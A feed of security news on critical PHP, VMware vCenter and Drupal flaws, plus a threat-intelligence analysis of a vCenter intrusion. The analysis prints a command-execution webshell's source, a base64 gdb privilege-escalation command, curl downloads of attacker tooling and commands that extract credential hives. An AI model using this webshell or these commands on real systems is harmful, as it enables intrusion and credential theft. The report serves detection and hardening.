Title: PHP Fixes 7 Critical Flaws, Including Bugs That Could Allow Remote Code Execution
Context: The PHP Foundation has released security updates to address multiple critical security flaws that could be exploited to achieve remote code execution on affected deployments,...
Full Text:
The PHP Foundation has released security updates to address multiple critical security flaws that could be exploited to achieve remote code execution on affected deployments, including CVE-2026-115560.

The list of vulnerabilities is as follows -

CVE-2026-115560 (CVSS score: 9.2) - An improper input validation vulnerability that could result in remote code execution, file modification, session corruption, or denial-of-service. (Fixed in PHP 8.2.36, 8.3.37, 8.4.28, 8.5.13, 8.6.0)

CVE-2026-129182 (CVSS score: 9.2) - A use-after-free vulnerability that could result in memory corruption and possible full remote code execution, as in the case of CVE-2026-109619. (Fixed in PHP 8.5.13, 8.6.0)

CVE-2026-126714 (CVSS score: 9.2) - A Time-of-check Time-of-use (TOCTOU) vulnerability that could result in the execution of arbitrary code with the privileges of the PHP worker. Successful exploitation requires an attacker's influence over the session data, an interruption at a useful point in the write, and an application with a suitable deserialization gadget chain. (Fixed in PHP 8.2.36, 8.3.37, 8.4.28, 8.5.13, 8.6.0)

CVE-2026-129289 (CVSS score: 9.2) - An inconsistent interpretation of HTTP requests vulnerability that could result in execution of attacker-controlled PHP code as the worker without another user's interaction or a non-default PHP configuration. Successful exploitation requires a front end that enables persistent backend connections and an application path that opens "php://input" without reading it fully, such as nginx with fastcgi_keep_conn on, Apache mod_proxy_fcgi with enablereuse=on, HAProxy FastCGI applications that retain backend connections, and LSAPI. (Fixed in PHP 8.2.36, 8.3.37, 8.4.28, 8.5.13, 8.6.0)

CVE-2026-129474 (CVSS score: 9.2) - A use-after-free vulnerability that could result in remote code execution on PHP 8.5 and later. Successful exploitation depends on the application and requires control over enough request data to influence memory allocation, a reachable magic method call, and a fatal error at the relevant point. (Fixed in PHP 8.5.13, 8.6.0)

CVE-2026-129481 (CVSS score: 9.2) - A use-after-free vulnerability that could cause an application's session cleanup to fail and potentially corrupt memory, crash a reused PHP worker, or potentially allow remote code execution. (Fixed in PHP 8.3.37, 8.4.28, 8.5.13, 8.6.0)

CVE-2026-129496 (CVSS score: 9.2) - A use-after-free vulnerability that could allow an unauthenticated remote attacker to crash PHP workers or execute arbitrary code with their privileges on an affected deployment. (Fixed in PHP 8.2.36, 8.3.37, 8.4.28, 8.5.13, 8.6.0)

CVE-2026-129291 (CVSS score: 8.8) - A use-after-free vulnerability that could result in local privilege escalation. Successful exploitation requires local code execution in an FPM worker, an affected pool with catch_workers_output enabled, the epoll event backend, and the ability to manipulate worker lifetimes and retain inherited pipe descriptors. (Fixed in PHP 8.2.36, 8.3.37, 8.4.28, 8.5.13, 8.6.0)

Depthfirst, which has codenamed CVE-2026-126714 "phpAfterShell," has described it as a critical flaw that can enable a remote attacker to run arbitrary code on affected servers.

"If a pwrite()/ftruncate() update is interrupted, PHP may leave behind a malformed session file that is later loaded by session_start(), yielding an arbitrary deserialization primitive," Depthfirst said. "Chained with another of our PHP-native deserialization-to-RCE findings, this leads directly to remote code execution."

It affects any application that runs an affected PHP version with file-based sessions. If immediate patching is not possible, it's advised to turn off session upload progress.

Patches for the flaws are available in the following versions -

PHP 8.2.36

PHP 8.3.37

PHP 8.4.28

PHP 8.5.13

PHP 8.6.0

Users who are using existing 8.2.x, 8.3.x, 8.4.x, and 8.5.x versions of PHP are advised to update to the latest version for optimal protection.

Title: Critical VMware vCenter Zero-Day Flaw Lets Network Attackers Bypass Authentication
Context: A critical flaw in VMware vCenter lets an attacker with network access bypass authentication and gain unauthorized access to the system, Broadcom, which owns VMware, said in an...
Full Text:
A critical flaw in VMware vCenter lets an attacker with network access bypass authentication and gain unauthorized access to the system, Broadcom, which owns VMware, said in an advisory published today.

Fixed versions are out for all supported branches, and the company lists no workaround. vCenter is the central console for managing an organization's ESX hosts and virtual machines.

The vulnerability is tracked as CVE-2026-123890 and is rated 9.8 on the CVSS scoring system. "VMware vCenter contains an authentication bypass vulnerability in the VMware Directory Service," the advisory says.

In an FAQ published with the advisory, the company says the issue "qualifies under ITIL methodologies as an emergency change," and urges organizations to consult their security staff immediately on timing.

The company has not reported any attacks exploiting the flaw, or any public exploit code. It also does not say what level of access an attacker gains after the bypass. Credit for reporting the bug goes to Google-owned Mandiant.

The bug is present in vCenter 8.0, 9.0, and 9.1, and in the vCenter builds that ship inside VMware Cloud Foundation, vSphere Foundation, and the Telco Cloud Platform and Telco Cloud Infrastructure products. That includes the older Cloud Foundation 5.x line. It is there whether or not Enhanced Linked Mode is in use.

Older versions are not cleared. The company no longer evaluates versions past end of support, and says vSphere 6.5 and 6.7 should be presumed affected. The same goes for vSphere 7.0, which left general support in October 2025, and whose customers can request a patch under an extended support contract.

None of the five flaws in the advisory lets code run on an ESX host from inside a virtual machine, and ESX itself is not affected, the advisory FAQ says.

There is no fallback for systems that cannot be updated yet: asked whether a workaround exists, the FAQ answers "Not as listed by Broadcom," while noting that mitigations may still exist in an organization's own defenses.

The updates are cumulative and cannot be installed through vCenter Quick Patch. Virtual machines continue running while vCenter installs the update, though management access drops briefly, and some encryption operations against a Standard Key Provider become unavailable until vCenter is back online.

One warning applies to upgrades already in progress: installing vCenter 8.0 U3m or 9.0.2.0200 blocks a later upgrade to VMware Cloud Foundation 9.1.1, a conflict the FAQ calls a "Back-in-Time" issue. The options are to upgrade vCenter to 9.1.1 first and apply the security update there, or to wait briefly for VCF 9.1.2.

The bypass is the second critical authentication flaw in the VMware Directory Service this year. The earlier vCenter flaws, patched on July 29, included CVE-2026-59309, another 9.8-rated bypass in the same component per the July advisory, alongside a directory-traversal bug, CVE-2026-59310.

Attacks on that traversal flaw began five days after its disclosure, German incident response firm QUIRSO assessed in August, linking them with moderate confidence to a suspected China-nexus actor.

The August attacks compromised an estimated 361 IP addresses in 47 countries and deployed Babuk-derived ransomware on ESXi hosts. Broadcom has reported no attacks on the new bypass.

The advisory also fixes four lower-severity flaws, rated 6.7 to 8.1: a SQL injection (CVE-2026-123891) and a command injection (CVE-2026-123892) in SDDC Manager, a privilege escalation to root on the SDDC Manager appliance (CVE-2026-123893), and a SAML token signature bypass in VMware Tools for Windows (CVE-2026-123894), exploitable only where Guest Alias mapping is configured. Each needs an authenticated or already privileged actor, and the last one stays inside the guest virtual machine.

Title: Drupal Patches Critical Installer Flaw That Could Give Unauthenticated Attackers Control of Sites
Context: Under specific conditions, a critical vulnerability in Drupal core can allow an attacker without login credentials to use the built-in installer to attempt to reinstall a site
Full Text:
Under specific conditions, a critical vulnerability in Drupal core can allow an attacker without login credentials to use the built-in installer to attempt to reinstall a site.

That can lead to a site takeover or remote code execution, and the project rates the vulnerable configurations as uncommon. Fixed releases for all supported branches shipped yesterday.

The Drupal Security Team disclosed the flaw, tracked as CVE-2026-132165, yesterday and rated it critical, 18 out of 25 on the project's risk scale.

The installer ships in every copy of Drupal core as the file /core/install.php and stays on the site after installation. Core's default .htaccess rules do not block requests to it, so blocking it is left to each site.

No attacks are reported in the security advisory, which rates exploitation as complex and records an existing proof-of-concept exploit. Some exploit paths are blocked where the web server cannot write to or change permissions on settings.php.

The team had told site owners in an advance notice earlier this week to set aside time for the update, warning that exploits may be developed within hours or days.

Every release below 10.6.22 is affected, along with Drupal 11 releases from 11.0.0 before 11.3.22 and from 11.4.0 before 11.4.13.

What to Do Now

The fixed versions, detailed in the project's release notes, are:

Drupal 11.4.x: update to 11.4.13

Drupal 11.3.x: update to 11.3.22

Drupal 10.6.x: update to 10.6.22

The team recommends blocking the installer even after updating. Sites that cannot update yet should follow the project's installer guidance, updated yesterday, which describes three options: a deny rule in the web server configuration, an .htaccess rule, or removing the file and keeping it removed with Composer scripts.

Sites that use the Drupal Steward protection service are already protected from known attack vectors, according to the team, and should still update in case new vectors emerge.

Drupal 11.2.x and earlier, 10.5.x and earlier, and Drupal 8 and 9 are end-of-life and get no fix. The 11.3.x branch and Drupal 10 lose security coverage altogether in December under the project's support schedule.

In the week of November 8, 154,485 of the 528,430 sites reporting usage data to drupal.org, about 29 percent, were running end-of-life branches.

The flaw was found by Anthropic's OSS Scanner, an automated service the AI company launched on October 8 to look for vulnerabilities in open-source projects that opt in. Findings go to maintainers without human review, each with a reproducer and, where available, a candidate patch, according to its launch announcement.

Drupal's security team said on November 2 that a surge of security reports, which it attributes to AI tools, is more than it can sustain at its current funding, and that it is cutting security coverage for core minor versions from 12 months to 8 starting in 2027.

This is the second critical remote code execution flaw fixed in Drupal core in two months, after the Field UI flaw patched on October 14, which also had at least one exploit path that needed no login.

Title: ARMORY CASTLE Exploits vSphere
Context: ARMORY CASTLE exploited a zero-day vulnerability to gain access to the VMware server, and likely used an additional set of malware customized to this environment to conduct...
Full Text:
Written by: Jayson Frost, Bryce Greathouse, Dhanesh Kizhakkinan, John Palmisano, Steve Rasch, Daniel Sislo, John Wolfram Introduction On Oct. 15, 2026, Mandiant and Google Threat Intelligence Group (GTIG) published a blog post detailing recent activity in which the suspected PRC-nexus threat actor ARMORY CASTLE (formerly tracked as UNC5221) exploited CVE-2026-102764, a zero-day vulnerability in BeyondTrust Remote Support, which was patched in BT26-05. We also described some of the threat actor’s post-exploitation operations. In this blog we describe additional post-compromise activity involving the exploitation of a vulnerability in VMware vCenter and the deployment of additional malware families. On Nov. 19, 2026, VMware disclosed CVE-2026-123890, which impacts VMware vCenter Server deployments. vSphere consists of both ESXi (the hypervisor) and vCenter Server. The vCenter server is a centralized platform deployed as a Photon Linux virtual appliance and is used to configure, control, and monitor ESXi host environments. CVE-2026-123890 is an unauthenticated Secure Remote Password (SRP-6a) session key disclosure vulnerability over Distributed Computing Environment/Remote Procedure Calls (DCE/RPC). Successful exploitation results in a remote authentication bypass which creates an authenticated session established as administrator@vsphere.local. Using the authenticated administrator session, the attacker can execute arbitrary commands and acquire files, including the data.mdb database, by leveraging the vCenter Server Directory Service (vmdird) RPC interface vmdirdbcp. We strongly recommend that affected organizations immediately apply the security patches provided by Broadcom to remediate the vulnerability. ARMORY CASTLE exploited this vulnerability in early September 2026 using BONESAW, according to forensic evidence. BONESAW is a utility primarily built to facilitate remote exploitation written in Golang , which utilizes CVE-2026-123890 to exfiltrate the arbitrary Lightning Memory-Mapped Database (LMDB), hijack the SAML Security Token Service (STS), and create a Single Sign On (SSO) Administrator account. ARMORY CASTLE’s use of BONESAW represents significant new insight into this threat actor’s post-exploitation tactics. In this campaign, ARMORY CASTLE exploited two zero-days, and deployed three sets of malware specifically tailored for operating on targeted devices, indicating deep platform expertise and substantial resource backing. We are publishing this analysis, along with mitigation and hardening guidance, to support defenders in detecting this threat. Threat Detail Moving laterally from the Remote SupportRemote Support device, ARMORY CASTLE established a foothold on an internal Linux appliance, escalated privileges to root, and staged a suite of malware to support expanding access, persistence, and targeting of vCenter. ARMORY CASTLE exploited a zero-day vulnerability to gain access to the VMware server, and likely used an additional set of malware customized to this environment to conduct reconnaissance, credential theft, and data theft. Figure 1: ARMORY CASTLE lateral movement and vCenter compromise sequence of events Move Laterally Following the establishment of persistence and the deployment of lateral movement capabilities on the Remote Support appliance, Mandiant observed ARMORY CASTLE conducting internal reconnaissance. This reconnaissance was heavily focused on VMware systems, based on the specific ports ARMORY CASTLE scanned and the URIs the group visited such as /sdk and /ui. The group leveraged nmap to scan the internal environment for systems running open ports specific to VMware, namely ports 9080, 5480, and 2012. Notably, port 2012 is used as the control interface RPC for vCenter Single Sign-On (SSO) and is an integral part of ARMORY CASTLE’s remote exploitation of CVE-2026-123890 through BONESAW. /usr/sbin/nmap -sS -p 443,2012,389 --open .0/24 /usr/sbin/nmap -sS -p 443,2012,5480 --open .0/24 /usr/sbin/nmap -sS -p 443,9080 --open .0/24 /usr/sbin/nmap -sS -p 9080,2012 --open .0/24 /usr/sbin/nmap -sS -p 443,2012,389,445,3389,22,21 --open .0/24 Figure 2: ARMORY CASTLE nmap port scanning ARMORY CASTLE moved laterally to internal Linux appliances within the environment that lacked endpoint detection and response (EDR) tooling. ARMORY CASTLE deployed five newly identified malware families and utilities: the SLIMSAVAGE and CAGEMATCH webshells, the BEARBONES backdoor, the BONESAW remote exploitation utility, and the SAWSNAKE SAML utility. ARMORY CASTLE also deployed the LAZYBONES backdoor, which Mandiant and GTIG previously observed in a separate ARMORY CASTLE intrusion. Establish a Foothold To establish a foothold on the first Linux appliance, the actor dropped a webshell ActiveSer.jsp, tracked by Mandiant as SLIMSAVAGE. SLIMSAVAGE functions as an upgraded command execution webshell that utilizes the authentication secret pwd=123. if("123".equals(request.getParameter("pwd"))){ try{ ProcessBuilder pb = new ProcessBuilder("/bin/sh","-c",request.getParameter("i")); Process p = pb.start(); InputStream a = p.getInputStream(), b = p.getErrorStream(); int c; byte[] d = new byte[2048]; out.print("
"); while((c=a.read(d))!=-1){out.print(new String(d,0,c));} while((c=b.read(d))!=-1){out.print(new String(d,0,c));} out.print("
"); out.print("\nEXIT:"+p.waitFor()); }catch(Exception e){out.print("ERR:"+e);} } Figure 3: SLIMSAVAGE Webshell By leveraging ProcessBuilder("/bin/sh", "-c", ...), the SLIMSAVAGE webshell executed commands inside a command line interpreter, enabled shell pipelines, redirects, creation of environment variables, and chained execution. The webshell reads from both standard output (getInputStream()) and standard error (getErrorStream()), ensuring full diagnostic visibility. It also calls Process.waitFor() and appends the final process return code (\nEXIT:). Roughly 4 hours later, ARMORY CASTLE deployed an additional webshell to the Linux appliance, u.jsp, tracked as CAGEMATCH. While SLIMSAVAGE provided the group with a robust capability to execute commands on the appliance, the group was limited in their ability to transfer data. To solve this challenge, CAGEMATCH acts as a dedicated payload staging webshell. The webshell checks for a multipart/form-data request header, parses the boundary delimiter, and extracts raw file bytes along with the original filename. File f = new File("/tmp"); f.mkdirs(); File fout = new File(f, fname); try(FileOutputStream fos = new FileOutputStream(fout)){ fos.write(fd); } m = fout.getAbsolutePath(); Figure 4: CAGEMATCH File Staging Logic CAGEMATCH creates the /tmp directory if necessary, saves the uploaded payload directly to /tmp/, and echoes the absolute target path back to the client. When accessed without an upload payload, it returns a minimal HTML upload form. This provides the attacker with a streamlined post-exploitation workflow: using CAGEMATCH to upload binary payloads, scripts, or tools from the Remote Support appliance directly into /tmp, and subsequently invoke SLIMSAVAGE to adjust execution permissions and execute the staged tools. Escalate Privileges To escalate privileges to root on the Linux appliance, ARMORY CASTLE repeated the same escalation technique used on the Remote Support appliance through the enablement of Set User ID (SUID) permissions on the binary /bin/env. ARMORY CASTLE performed this permission modification using the GNU Debugger, gdb. By enabling SUID permissions on the binary /bin/env, any user would be allowed to execute commands as root. /bin/sh -c echo IWNobW9kIHUrcyAvYmluL2VudgpxCg==|base64 -d > /tmp/gdb_file /usr/bin/gdb -pid 113757 --command=/tmp/gdb_file Figure 5: ARMORY CASTLE gdb Privilege Escalation Move Laterally After successfully escalating privileges to root, ARMORY CASTLE began staging additional tooling on the Linux appliance to enable lateral movement within the environment. ARMORY CASTLE used curl to download the RAR utility from the Remote Support appliance. curl -o /tmp/rar -k https:///content/r.js Figure 6: ARMORY CASTLE downloads staged RAR utility ARMORY CASTLE then utilized curl to download a rar archive 123.rar which was subsequently extracted using their downloaded RAR binary. curl -o /tmp/123.rar -k https:///content/r.js ./rar x -p 123.rar Figure 7: ARMORY CASTLE extracts BONESAW Tracked as BONESAW, /tmp/123 is a remote exploitation utility written in Golang that leverages CVE-2026-123890 in vCenter to enable remote arbitrary LMDB exfiltration, SAML STS hijacking, and SSO administrator account creation. Mandiant observed ARMORY CASTLE leveraging this utility to target an internal vCenter server, successfully creating an SSO admin account, exfiltrating and parsing the LMDB which enabled lateral movement to the server. BONESAW achieves full system compromise against vCenter Server 7.x and 8.x appliances through the exploitation of CVE-2026-123890. This vulnerability exploits a cryptographic logic and authorization flaw in VMware's rpc_srp_verifier service over port 2012, exposing a shared session key that can be used to create authenticated sessions as administrator@vsphere.local. BONESAW also provides the ability to stream the raw underlying LMDB file for offline parsing, extract the VMware Security Token Service (STS) SAML private RSA signing key, create a backdoor machine account via vmdir, forge administrative SAML 2.0 assertion tokens, and assign Global Administrator privileges on the vCenter root folder via the vSphere SOAP API. While CVE-2026-123890 shares some overlap with CVE-2026-59309, primarily the obtaining of the shared session key "K" without knowing the password, there are multiple key differences between them. CVE-2026-59309 is a flaw in the vCenter Server vmdir daemon that allows a remote, unauthenticated attacker with network access to TCP ports 389 or 636 to send crafted LDAP packets with malformed authorization tokens, bypassing authentication to forge administrative sessions and create rogue Single Sign-On (SSO) accounts in the vSphere directory. Whereas CVE-2026-123890 is a flaw in the vmdir DCE/RPC interface that enables unauthenticated Secure Remote Password session key disclosure by exploiting predictable UUIDv1 timestamp generation in the SRP authentication interface, enabling the compromise of the SRP session key without knowing any passwords. Mandiant has evidence that ARMORY CASTLE had knowledge of CVE-2026-123890 prior to the disclosure of CVE-2026-59309 on July 29, 2026. Logs indicate that BONESAW was executed in early September 2026 against a vCenter server already patched against CVE-2026-59309, and the recovered Go binary contains a build timestamp of 2026-07-13T09:21:24Z (16 days before CVE-2026-59309 was disclosed), although Go build metadata can be modified prior to compilation. ARMORY CASTLE named BONESAW vcenter-db-teamcheck-go and compiled it in a Windows development environment based on Golang build artifacts: E:/CodeFiles/VulnScan/Vcenter/go_teamcheck/. BONESAW supports multiple command-line arguments, with primary functionality centered on the csa subcommand to remotely create an SSO admin account. Subcommand csa ("Create SSO admin with minimal parameters"): • Loads embedded default configuration template and parses CLI flags: • -h: Target vCenter address or vim25 SOAP endpoint (required). • -u: Username for the new SSO admin account (required). • -p: Password for the new SSO admin account (required). • -lu: Existing vCenter local admin UPN used for the vmdird bridge authentication (default: administrator@vsphere[.]local). • -d: Tenant/domain name for the created SSO account (default: vsphere[.]local). • -mdb-path: Path to an existing data.mdb file to skip remote database download. • -check-version: Probe target version and connectivity before executing the exploit chain. • -auto-d: Auto-discover SSO tenant/domain before running (overrides -d if discovery succeeds). Figure 8: BONESAW Command Line Arguments When executed utilizing the CSA command line flag, BONESAW creates the following files on disk: /temp/extracted_tenant_signer_/anon__data.mdb (Exfiltrated copy of /storage/db/vmware-vmdir/data.mdb) /temp/extracted_tenant_signer_/-tenantcredential-.key.pem (Extracted RSA private key in PEM format) /temp/extracted_tenant_signer_/-tenantcredential-.key.der (Extracted RSA private key in DER format) /temp/extracted_tenant_signer_/-tenantcredential-.leaf.pem (Extracted leaf X.509 signing certificate) /temp/extracted_tenant_signer_/-tenantcredential-.chain.pem (Extracted X.509 certificate chain) /temp/extracted_tenant_signer_/-tenantcredential-.context.json (Target SSO and signer metadata) Figure 9: BONESAW Filesystem Artifacts Shortly after the successful execution of BONESAW, ARMORY CASTLE staged and deployed an additional utility /tmp/sss tracked as SAWSNAKE to the Linux appliance. SAWSNAKE is a Golang utility that enables vCenter SAML authentication bypass and session cookie generation, ultimately enabling ARMORY CASTLE to conduct Golden SAML attacks against vCenter following the successful execution of BONESAW. This allows the threat actor to forge authentication tokens, bypass MFA, and impersonate any user. The core functionality of SAWSNAKE is a custom Go-based port of the Python-based vCenter SAML Login Tool from vcenter_saml_login.py. SAWSNAKE provides the ability to extract Identity Provider (IdP) signing keys and trusted certificates from a vCenter data.mdb database, export extracted credentials to PEM files on disk, forge and sign SAML 2.0 assertions for the Administrator account, and authenticate to a target vCenter server to obtain administrative session cookies. SAWSNAKE parses command-line arguments to determine its operating mode and supports the following command line arguments: -h, --help - show this help message and exit -p, --path PATH - Path to the data.mdb file (extract mode) -t, --target TARGET - The IP address of the target vCenter -k, --key KEY - IdP private key PEM file (direct-cert mode) -c, --cert CERTS - Trusted certificate PEM file. May be repeated; each file may contain one or more CERTIFICATE blocks. --domain DOMAIN - SSO domain (default: parse from certificate subject DC=) --hostname HOSTNAME - vCenter FQDN (default: read from vCenter SSL certificate) -e, --export-dir EXPORT_DIR - Parse data.mdb with --path and write the PEM files needed for the direct-cert mode to this directory, then exit. -v, --verbose - Print extracted/loaded certificates Figure 10: SAWSNAKE Command Line Arguments SAWSNAKE creates the following files on disk: /idp_key.pem /trusted_cert_2.pem /domain.txt Figure 11: Files created by SAWSNAKE Mandiant identified a second sample of SAWSNAKE that is likely an updated version. This sample added verbose debug logging to standard output across TLS, HTTP, SAML initiation, XML signing, and login routines, along with expanded redirect handling for up to 10 HTTP 302 redirects to support multi-hop authentication. Consistent with earlier activity, ARMORY CASTLE deleted SAWSNAKE and its output files from disk using rm. Shortly after the deployment of SAWSNAKE, ARMORY CASTLE leveraged an additional backdoor /tmp/dbr tracked as BEARBONES. BEARBONES is written in C and is based on the open-source Dropbear SSH Server. It is capable of bypassing system password authentication when using password-based authentication, logging plaintext credentials, and loading or generating server host keys from /tmp instead of the default directory /etc/dropbear. The authentication handler svr_auth_password for the packet type SSH_MSG_USERAUTH_REQUEST was backdoored to bypass /etc/shadow validation and grant access if the SHA-256 digest of the first 14 bytes of client password matches a hardcoded SHA-256 hash, while also logging plaintext credentials. Additionally, the internal version string and the session identification string were modified to “23345” and “SSH-2.0-pulsesecure_23345”. Pivoting on this SSH banner identified a suspected obfuscation network of compromised third-party firewalls and routers exposing SSH-2.0-pulsesecure_23345 on non-standard high TCP ports. ARMORY CASTLE executed BEARBONES several times from the Linux appliance, first attempting to open a listener on TCP port 53 and later on TCP port 33992. /tmp/dbr -R -p 53 /tmp/dbr -R -p 33992 Figure 12: BEARBONES Command Line Execution After the execution of BEARBONES to create a listener on TCP port 33992, ARMORY CASTLE moved laterally to the vCenter appliance as the Administrator and created a local administrator account named sps-@vsphere.local. Notably, ARMORY CASTLE enabled SSH on vCenter via the vCenter Server Appliance Management Interface (VAMI) API through a PUT request to /rest/appliance/access/ssh. Mandiant also observed this TTP during BRICKSTORM intrusions conducted by suspected PRC-nexus actor UNC6201. After enabling SSH, ARMORY CASTLE connected to the vCenter via SSH using the newly created local administrator account. ARMORY CASTLE then conducted credential theft, targeting the vCenter internal master crypto key file as well as the PostgreSQL password file using SSH. ARMORY CASTLE disabled the SSH service via the VAMI API immediately after extracting the vCenter master symmetric key and PostgreSQL database credentials. ARMORY CASTLE then was observed authenticating to ESXi Host Client (“ESXUI”) using the vpxuser account and also connected to it via SSH using the root account. Complete Mission ARMORY CASTLE used the WinSCP client to enumerate the ESXi file system, attached disks, mounted Virtual Machine File System (VMFS) volumes, and added an SSH public key to the root account’s authorized keys. ARMORY CASTLE conducted further reconnaissance and data theft on the ESXi filesystem using the root account. The actor was primarily observed enumerating directories and VMFS volumes. To stage and exfiltrate data from the ESXi filesystem, ARMORY CASTLE created a hidden directory, .a, on a VMFS volume to which they established an SCP connection to the ESXi using scp -r -d -t "/vmfs/volumes//.a". ARMORY CASTLE then staged and extracted a suspected VMware specific toolset onto the ESXi host using tar xzf vmfs-pydist.tar.gz. python vmfs_browser.py -d "/dev/disks/vml.:1" ls . python vmfs_browser.py -d "/dev/disks/vml.:1" info "-flat.vmdk" python vmfs_browser.py -d "/dev/disks/vml.:1" ls "-flat.vmdk:part2" python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/NTDS" ./NTDS python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/System32/config/SYSTEM" ./SYSTEM python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/System32/config/SECURITY" ./ python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/System32/dns" ./ Figure 13: ARMORY CASTLE reconnaissance of guest VMs ARMORY CASTLE then archived the extracted files into o.tar.gz, copied the archive from the ESXi filesystem using scp -r -p -d -f "o.tar.gz", and deleted the hidden .a directory. ARMORY CASTLE established persistence using a systemd service file set to restart every 50 minutes. LAZYBONES is a lightweight backdoor, written in Go, that establishes command-and-control (C2) communication over HTTPS using Slack. This malware periodically checks the most recent message in a designated Slack channel for commands. LAZYBONES supports core backdoor functionalities, including command execution and file transfer. Specifically, this variant encrypts Slack C2 messages with AES-256-CTR prior to Base64 encoding, polls with a 150 to 450 second jitter interval, and supports four commands (cmd, upload, download, and sleep) for command execution, file transfer, and beacon interval adjustment. Mandiant observed ARMORY CASTLE deploying LAZYBONES in a separate campaign in early 2025 following the successful exploitation of CVE-2025-22457. Attribution GTIG attributes this activity to the suspected PRC-nexus espionage actor ARMORY CASTLE (formerly tracked as UNC5221). As noted in our prior blog, the tooling and TTPs leveraged within this campaign align with previously observed activity from ARMORY CASTLE, and in the case of LAZYBONES, directly overlap with previously observed activity. Outlook and Implications While GTIG and Mandiant have tracked ARMORY CASTLE exploiting zero-days and n-days in edge and security appliances for initial access since 2023, BONESAW represents a significant expansion into post-compromise use of zero-days. The group's use of VMware-specific tools like SAWSNAKE and vmfs_browser.py, alongside malware designed to operate on Remote Support and Linux systems, represent a diverse toolset including capabilities specifically tailored to target several different appliances, demonstrating the threat actor's deep understanding of each. The use of three separate specialized sets of malware and two zero-days in the course of a single compromise indicates that there are significant resources supporting ARMORY CASTLE operations. It also shows the extent of the threat actor’s operational commitment to compromise high priority targets. Lastly, it is important to highlight that the build time of BONESAW predates its deployment in this intrusion by over a month, indicating it was likely developed for broader operations. Remediation and Hardening The exploitation of CVE-2026-123890 by ARMORY CASTLE underscores a reality: virtualization infrastructure such as VMware vCenter remains a prime target for advanced persistent threats (APTs). Because vCenter serves as the centralized control plane for the virtualized data center, relying solely on reactive patching is insufficient to protect it. Organizations must adopt a proactive, Zero Trust approach to infrastructure hardening to defend against current and undiscovered zero-day vulnerabilities. For a comprehensive framework on securing virtualization platforms against advanced persistent threats, organizations are highly advised to consult the Mandiant guide vSphere and BRICKSTORM Malware: A Defender's Guide. This guide details an infrastructure-centric defense strategy, encompassing STIG benchmarking, identity management via Privileged Access Workstations (PAWs), and transforming the vCenter appliance into a proactive security sensor. To secure vulnerable systems, it is highly recommended that affected organizations promptly deploy the official Broadcom patch. The Risks of Default Configurations: The VCSA Host-Based Firewall A common misconception in defending the vCenter control plane is that the native VCSA host-based firewall managed via the Virtual Appliance Management Interface (VAMI) provides adequate protection against lateral movement. In practice, relying on this default GUI-based firewall introduces severe operational and security limitations that threat actors like ARMORY CASTLE exploit: Lack of Port-Specific Granularity: The native VAMI GUI lacks the precision required for a Zero Trust model. To grant an internal server (such as a backup server) legitimate access to the vSphere API on TCP 443, an administrator is often forced to trust that IP for all ports. If that internal server is compromised, the attacker inherits an unobstructed path to highly sensitive management interfaces like SSH (22) and the VAMI (5480). Circular Administrative Dependency: The VCSA firewall is managed via the VAMI, which resides on TCP port 5480. If an attacker gains VAMI access as ARMORY CASTLE demonstrated to enable SSH, they can use their compromised role to deactivate the firewall entirely. Forensic Visibility Gaps: The VAMI firewall is designed for connectivity management, not security monitoring, and does not generate remote logs for denied connection attempts or shell activity. This blinds the SOC to active lateral movement and port scanning. Inbound-Only Policy: The default GUI focuses exclusively on inbound traffic, leaving outbound (egress) policy unmanaged. This allows malware on a compromised VCSA to communicate freely with external command-and-control (C2) infrastructure. Proactive Hardening with the VCSA Hardening Tool To secure the vCenter control plane against advanced campaigns and future zero-days, Mandiant recommends utilizing the VCSA Hardening & Logging Tool. This script bypasses the vulnerable VAMI GUI and enforces security configurations directly at the Photon Linux kernel level via iptables. By transitioning the appliance to a strict "Default Deny" posture, enforcing granular egress filtering, and bridging kernel-level events to a remote SIEM, the tool transforms the VCSA from a passive appliance into an active security sensor. The table below illustrates how deploying this proactive hardening script would have disrupted ARMORY CASTLE's attack chain at multiple stages, demonstrating its efficacy against zero-day exploits. VCSA Hardening Feature Impact on the ARMORY CASTLE Attack Chain Protection Against Future Zero-Days VCSA iptables Inbound DROP Policy & Connection Logging (Management Ports) The nmap scans targeting TCP ports 443, 5480, and 22 are silently dropped because the attacker's source IP is not in the trusted whitelists. These blocked connection attempts are instantly forwarded to the SIEM via the iptables-log-bridge.sh service, exposing the active network reconnaissance. Conceals critical management interfaces from internal network mapping tools and provides high-fidelity, early-warning alerts of active lateral movement before exploitation can occur. VCSA iptables Inbound DROP Policy (TCP 443) Even if BONESAW extracts the SAML key over port 2012, the attacker cannot utilize the SAWSNAKE-forged administrative cookies. The firewall drops all connections to the vSphere Web Client/API (TCP 443) from the compromised Linux appliance because it is not in the TRUSTED_WEB_IPS array. Provides defense-in-depth: Even if a zero-day allows credential theft or authentication bypass on a backend service, the stolen credentials/tokens cannot be used to access the management plane from an untrusted network. VCSA iptables Inbound DROP Policy (TCP 2010) An iptables DROP policy on TCP 2012 for non-allowlisted IPs prevents the exploit payload originating from a compromised Linux appliance from reaching the vmdird service. Drops unauthorized inbound connections to management interfaces and RPC services, mitigating network-level exploitation of vulnerable services. VCSA iptables Inbound DROP Policy (TCP 22 & 5480) Blocks the OS-level pivot. The firewall drops the PUT request to the VAMI API (TCP 5480 or 443) used to enable the SSH daemon. Furthermore, even if SSH was already enabled, the VCSA_SSH_RULES chain drops all SSH connections Protects the underlying OS and databases from direct credential theft or tampering. Even if an attacker gains administrative privileges within the web application, they are blocked from dropping down to a root shell. VCSA iptables Egress DROP Policy An egress DROP policy prevents SCP data exfiltration and blocks the LAZYBONES backdoor from establishing HTTPS C2 communications with external Slack endpoints. Blocks unauthorized outbound internet and internal network connections, preventing the VCSA from acting as a pivot point or establishing external C2. VCSA OS-Level Command and Syslog Auditing Remote syslog forwarding captures the execution of tar and Python vmfs_browser.py over SSH, exposing the extraction of NTDS.dit and registry hives in real-time. Forwards bash command execution and dropped network packets to a SIEM, bypassing local anti-forensics (e.g., .bash_history deletion) and alerting on unauthorized shell activity. VCSA Kernel-Level Rule Enforcement iptables rules operate independently of the VAMI application, preventing the actor from using the VAMI API (/rest/appliance/access/ssh) to circumvent network security controls. Decouples network security from the vCenter application layer, ensuring firewall policies cannot be modified via compromised VAMI or vSphere administrative credentials. Title: 30 Years of Gatekeeper Asymmetry Doom: The Paradox that Makes Powerful LLMs More Vulnerable
